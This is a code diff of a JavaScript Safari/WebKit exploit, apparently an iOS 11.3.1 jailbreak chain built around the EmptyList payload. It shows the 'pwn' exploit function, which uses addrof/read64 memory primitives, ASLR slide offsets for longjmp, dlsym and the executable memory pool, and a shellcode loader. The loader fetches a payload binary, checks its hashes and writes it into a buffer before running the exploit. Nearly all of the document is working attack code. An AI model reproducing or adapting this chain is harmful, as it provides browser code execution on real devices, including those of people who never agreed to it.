@@ -12,6 +12,7 @@ using('liblogging');
 using('libaddressspace');
 using('libc');
 
+var memdump_addr = 0;
 
 var NO = false;
 var YES = true;
@@ -30,8 +31,8 @@ UNITY.TB = UNITY.GB * UNITY.GB;
 var CONFIG = {};
 CONFIG.INTEGRITY_CHECKS_ENABLED = confirm("Enable integrity checks?");
 CONFIG.MEMORYDUMP_ENABLED = confirm("Enable memory dump?");
-//CONFIG.USE_ELECTRA = confirm("Use Electra to jailbreak (not possible yet)? ");
-CONFIG.VERBOSITY == prompt("verbosity level: ", VERBOSITY.DEFAULT);
+CONFIG.USE_ELECTRA = confirm("Use Electra to jailbreak (not possible yet)? ");
+verbosity = prompt("verbosity level: ", VERBOSITY.DEFAULT);
 CONFIG.MAX_SHELLCODE_SIZE = 0x1000000;
 CONFIG.MEMDUMP_SIZE = 0;
 
@@ -99,15 +100,8 @@ function hex2a(hexx) {
     return str;
 }
 
-function memdump(addr, size, readfunc){
-    var str = '';
-    var end = addr+(size*8);
-    while(addr < end) {
-        var x = readfunc.read64(addr);
-        str+=hex2a(x.toString())+" ";
-        addr+=8;
-    }
-    puts(str);
+function memdump(size, addr, readfunc){
+   return vm_read64(addr, size, readfunc);
 }
 
 function hexdump(data) {
@@ -199,9 +193,11 @@ function trigger(constr, modify, res, val) {
 
 //The exploit
 var pwn = function() {
-    verbosity = CONFIG.VERBOSITY;
     if(CONFIG.MEMORYDUMP_ENABLED) {
         CONFIG.MEMDUMP_SIZE = parseInt(prompt("Enter size of memory dump", 10));
+    }
+    if(CONFIG.USE_ELECTRA) {
+        print('Electra cannot be used to jailbreak your device via safari yet, continueing with rootlessJB.');
     }
     _off = window.chosendevice.offsets;
     console.log('Starting stage 1...');
@@ -407,7 +403,6 @@ var pwn = function() {
     var wrapper_addr = stage2.addrof(wrapper);
     var el_addr = stage2.read64(wrapper_addr + 0x20);
     var vtab_addr = stage2.read64(el_addr);
-    
 
     if(verbosity >= VERBOSITY.HIGH){
         print("Lets hope our offsets are correct as we will now use them.");
@@ -420,6 +415,8 @@ var pwn = function() {
     var g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
     var longjmp = _off.longjmp + slide;
     var dlsym = _off.dlsym + slide;
+
+    var testbool = 0;
 
     var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
     var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
@@ -442,9 +439,7 @@ var pwn = function() {
     );
 
     function legacy_execution() {
-        if(CONFIG.MEMORYDUMP_ENABLED) {
-            memdump(ptr_stack_check_guard, CONFIG.MEMDUMP_SIZE, stage2);
-        }
+        alert('Legacy iPhones (< iPhone 8) can not be jailbroken yet.');
     }
 
     function modern_execution() {
@@ -512,63 +507,79 @@ var pwn = function() {
         legacy_execution();
     } else {
         modern_execution();
+         if(verbosity >= VERBOSITY.DEFAULT) {
+            print('EmptyList is started, please close all background apps then dismiss this alert.');    
+        }
+        wrapper.addEventListener('click', function(){});
     }
 
-    if(verbosity >= VERBOSITY.DEFAULT) {
-        print('EmptyList is started, please close all background apps then dismiss this alert.');    
-    }
-
-    wrapper.addEventListener('click', function(){});
+   
 };
+
+
+function gethashes(str) {
+    return {
+        md5: md5(str),
+        sha1: Sha1.hash(str),
+        sha256: sha512_256(str),
+        sha384: sha384(str),
+        sha512: sha512(str)
+    };
+}
 
 function integrity_checks(buffer) {
     if(CONFIG.INTEGRITY_CHECKS_ENABLED) {
         var shellcode_data = new Uint8Array(buffer);
-        var shellcode_hashes = {
-            md5: md5(shellcode_data.join('')),
-            sha1: Sha1.hash(shellcode_data.join('')),
-            sha256: sha512_256(shellcode_data.join('')),
-            sha384: sha384(shellcode_data.join('')),
-            sha512: sha512(shellcode_data.join(''))
-        };
+        var shellcode_hashes = gethashes(shellcode_data.join(''));
         
         if(
-            shellcode_hashes.md5 !== "4a7cb4df072782a2a0273593b96f5278" || 
-            shellcode_hashes.sha1 !== "1fdbc8b15b25819eb8403e402ca7f32f489ff01d" ||
-            shellcode_hashes.sha256 !== "2d3d35db971e0697aaacc56ffc2af2967609f3c016a9de180b2ba9a4adbb74d0" ||
-            shellcode_hashes.sha384 !== "f277af627fceec928b6579ac67c8173abde382ed836f13416a1c3e215d3928cd79bcbd53b9b7fef2188a5afeec80034c" ||
-            shellcode_hashes.sha512 !== "e4c01d654f1f33002da2033c8eb9509e7fb2f5275d7fc4dfd49fd420cf76da6b3b712df4e0c35e51e66c9c5249a3c7146c14e01242db77673a747e73ef649bdc"
+            shellcode_hashes.md5 !== "ea21cf2e6a39ed1ff842d719ec9f3396" || 
+            shellcode_hashes.sha1 !== "162d54f4f9214fb8c8099b48cc97a60543220e1c" ||
+            shellcode_hashes.sha256 !== "e00592b23afda7aeb7ee6ec7baf8b2b70d64b1110d26b31921c50003378fdc2b" ||
+            shellcode_hashes.sha384 !== "72dd7c0573513c0033cf67d8700ed069644a1f3ff4249b0b271a29047ba3b66b0c66f5d31dc16ed54731fc19300e4a50" ||
+            shellcode_hashes.sha512 !== "fb2d3b8509f15a57b72574e5c11b11808b7882cf385a41d49344ca7a0e3910c380e9fe7f72b7a8b717780ccb9e847b0cb55686c56f44688a8876ce56aa8403a0"
         )
         {
             throw new Error('Shellcode integrity check failed.');
+        } else {
+            print('Shellcode integrity checks passed!');
         }
     }
 }
 
+
 function wk113go() {
-    fetch('payloads/11_3_1/emptylist_ACK.bin').then((response) => {
-        response.arrayBuffer().then((buffer) => {
-            try{
-                
-                shellcode_length = buffer.byteLength;
-                if(shellcode_length > CONFIG.MAX_SHELLCODE_SIZE) {
-                    fail(5);
+
+    var inline_wk113go = function(buffer) {
+        try{
+            
+            shellcode_length = buffer.byteLength;
+            if(shellcode_length > CONFIG.MAX_SHELLCODE_SIZE) {
+                fail(5);
+            }
+            
+            integrity_checks(buffer);
+            u8_buffer.set(new Uint8Array(buffer), 0x4000);
+
+            if(verbosity >= VERBOSITY.HIGH) { 
+                print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
+                if(!CONFIG.INTEGRITY_CHECKS_ENABLED) {
+                    print(
+                        JSON.stringify(
+                            gethashes(
+                                new Uint8Array(buffer).join('')
+                            )
+                        )
+                    );
                 }
-                
-                integrity_checks(buffer);
-                u8_buffer.set(new Uint8Array(buffer), 0x4000);
-
-                if(verbosity === VERBOSITY.HIGH) { 
-                    print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
-                }
-
-                return pwn();
-
-            } 
-            catch(exception) {
-                alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
             }
 
-        });
-    });
+            return pwn();
+
+        } 
+        catch(exception) {
+            alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
+        }
+    };
+    FileStorage.getcontents(FileStorage.mode.FETCH, 'payloads/11_3_1/emptylist_ACK.bin', inline_wk113go);
 }
